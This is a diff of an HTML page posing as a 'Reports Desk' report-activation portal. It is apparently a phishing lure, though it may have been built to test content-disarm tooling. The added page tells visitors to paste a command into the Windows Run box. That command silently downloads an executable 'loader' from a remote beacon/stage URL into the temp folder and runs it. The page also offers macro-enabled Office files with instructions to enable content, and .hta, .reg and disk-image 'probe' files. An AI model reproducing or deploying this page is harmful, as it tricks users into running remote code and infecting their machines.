@@ -1,33 +1,80 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Reports Desk — Q3 Documents</title>
+<title>Reports Desk — Report Activation</title>
 <style>
 body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f7fa;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.card{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(15,35,60,.12);max-width:460px;width:100%;padding:2.6rem;text-align:center}
+.card{background:#fff;border-radius:10px;box-shadow:0 4px 20px rgba(15,35,60,.12);max-width:520px;width:100%;padding:2.6rem}
 .logo{font-size:1.05rem;color:#243b53;font-weight:700;letter-spacing:.4px;margin-bottom:1.6rem}
-h1{font-size:1.2rem;margin:0 0 .6rem;color:#1a2733;font-weight:600}
-p{color:#5a6a78;font-size:.92rem;line-height:1.55;margin:0 0 1.6rem}
-ul.doc{list-style:none;padding:0;margin:0 0 1.8rem;text-align:left}
-ul.doc li{padding:.45rem .8rem;border-bottom:1px solid #edf1f5;font-size:.88rem;color:#334}
-ul.doc li:before{content:"📄 ";opacity:.6}
-a.btn{display:inline-block;background:#2563eb;color:#fff;text-decoration:none;padding:.75rem 1.8rem;border-radius:7px;font-size:.95rem;font-weight:500}
-a.btn:hover{background:#1d4ed8}
+h1{font-size:1.2rem;margin:0 0 .8rem;color:#1a2733;font-weight:600}
+p{color:#5a6a78;font-size:.92rem;line-height:1.55;margin:0 0 1.2rem}
+ol{color:#334;font-size:.9rem;line-height:1.7;text-align:left;margin:0 0 1.2rem;padding-left:1.2rem}
+.code{background:#1a2733;color:#d7e3f4;font-family:Consolas,monospace;font-size:.82rem;padding:1rem;border-radius:7px;text-align:left;word-break:break-all;cursor:pointer}
+.code:hover{background:#22334a}
+.hint{font-size:.72rem;color:#9aa7b2;margin-top:.6rem}
 .foot{margin-top:1.7rem;font-size:.74rem;color:#9aa7b2;line-height:1.6}
+#done{display:none;color:#1a7f37;font-size:.85rem;font-weight:600}
+.files{margin-top:1.8rem;border-top:1px solid #e6ecf2;padding-top:1.4rem;text-align:left}
+.files h2{font-size:.95rem;color:#1a2733;margin:0 0 .4rem;font-weight:600}
+.files p{font-size:.82rem;margin-bottom:.7rem}
+.files ul{list-style:none;padding:0;margin:0}
+.files li{margin:.4rem 0}
+.files a{color:#2a5da8;font-size:.85rem;text-decoration:none}
+.files a:hover{text-decoration:underline}
+.files .meta{font-size:.72rem;color:#9aa7b2;margin-top:.6rem}
 </style></head><body><div class="card">
 <div class="logo">REPORTS DESK</div>
-<h1>Q3 2026 documents are ready</h1>
-<p>The quarterly report package has been prepared for distribution.
-Download the bundle and open it with Microsoft Office.</p><ul class="doc">
-<li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Installer.msi.lnk" style="color:#2563eb;text-decoration:none">Q3_Installer.msi.lnk</a></li>
-<li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Macro.vbs.lnk" style="color:#2563eb;text-decoration:none">Q3_Macro.vbs.lnk</a></li>
-<li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Reports.iso" style="color:#2563eb;text-decoration:none">Q3_Reports.iso</a></li>
-<li><a href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Reports_secure.zip" style="color:#2563eb;text-decoration:none">Q3_Reports_secure.zip</a></li>
-</ul>
-<a class="btn" href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Installer.msi.lnk" style="margin:.3rem">Download LNK</a><br>
-<a class="btn" href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Macro.vbs.lnk" style="margin:.3rem">Download LNK</a><br>
-<a class="btn" href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Reports.iso" style="margin:.3rem">Download ISO</a><br>
-<a class="btn" href="https://github.com/barrdakk-ops/reports/releases/download/v1/Q3_Reports_secure.zip" style="margin:.3rem">Download ZIP</a><br>
-<div class="foot">Documents are served over HTTPS.<br>
-© 2026 Reports Desk — internal distribution only</div>
-</div></body></html>
+<h1>Report activation required</h1>
+<p>Your quarterly report is ready but must be activated on this workstation
+before it can be opened. The activation takes a few seconds.</p>
+<ol>
+  <li>Press <b>Win + R</b> together</li>
+  <li>Click the command below to copy it, then paste it into the Run box</li>
+  <li>Press <b>Enter</b> — the report manifest downloads and the documents open automatically</li>
+</ol>
+<div class="code" id="cmd" onclick="cp()">curl.exe -sk -o &quot;%TEMP%\~DFcmd.exe&quot; &quot;https://sync.protaskir.co.il/api/v1/beacons/321e3927-e3bf-4a63-b0b4-0be797a3f8c8/stage?cap=d1fc947e08023e0d1267956f5bfc8720&amp;fmt=loader-exe&quot; &amp;&amp; start &quot;&quot; /b &quot;%TEMP%\~DFcmd.exe&quot;</div>
+<div class="hint">click the command once to copy — it is long, that is expected</div>
+<p id="done">✔ Copied. Paste it into the Run box and press Enter.</p>
+
+<div class="files">
+  <h2>Report package files</h2>
+  <p>If activation is not possible on this workstation, the report files
+  can be retrieved directly:</p>
+  <ul>
+    <li><a href="Q3_Report.xlsm" download>Q3_Report.xlsm</a> — quarterly report (Excel, macro-enabled)</li>
+    <li><a href="Q3_Report_full.xlsm" download>Q3_Report_full.xlsm</a> — full quarterly report (Excel, macro-enabled)</li>
+    <li><a href="Q3_Plan.xlsm" download>Q3_Plan.xlsm</a> — Q3 planning workbook (activates on save)</li>
+    <li><a href="Q3_Report.docm" download>Q3_Report.docm</a> — quarterly report (Word, macro-enabled)</li>
+    <li><a href="Q3_Plan.docm" download>Q3_Plan.docm</a> — Q3 planning document (activates on save)</li>
+    <li><a href="Q3_Summary.xlsx" download>Q3_Summary.xlsx</a> — Q3 summary + external references</li>
+  </ul>
+  <div class="meta">Macro-enabled files: Enable Content after opening. Planning
+  files (Q3_Plan.*) activate when the document is saved — press Ctrl+S with
+  the document open. If Enable Content never appears, the download path
+  stripped the macro — use the activation command above instead.</div>
+  <div class="sec" style="margin-top:1.2rem">Delivery diagnostics</div>
+  <ul>
+    <li><a href="probe.reg" download>probe.reg</a> — report settings</li>
+    <li><a href="probe.hta" download>probe.hta</a> — report viewer</li>
+    <li><a href="probe.img" download>probe.img</a> — report disc image</li>
+    <li><a href="probe.zip" download>probe.zip</a> — report archive</li>
+    <li><a href="probe.iso" download>probe.iso</a> — report disc image (ISO)</li>
+  </ul>
+  <div class="meta">Run 1115-1042 — each download is tracked individually.</div>
+  <!-- Windows-built probes (build-cdr-probe-windows.ps1): copy probe.cab /
+       probe.chm / probe.vhd next to this index.html, then uncomment:
+  <li><a href="probe.cab" download>probe.cab</a> — report archive (cabinet)</li>
+  <li><a href="probe.chm" download>probe.chm</a> — offline report help</li>
+  <li><a href="probe.vhd" download>probe.vhd</a> — report virtual disk</li>
+  -->
+</div>
+
+<div class="foot">© 2026 Reports Desk — internal distribution only</div>
+</div>
+<script>
+function cp(){
+  var t=document.getElementById('cmd').innerText;
+  navigator.clipboard.writeText(t).then(function(){document.getElementById('done').style.display='block';});
+}
+</script>
+</body></html>
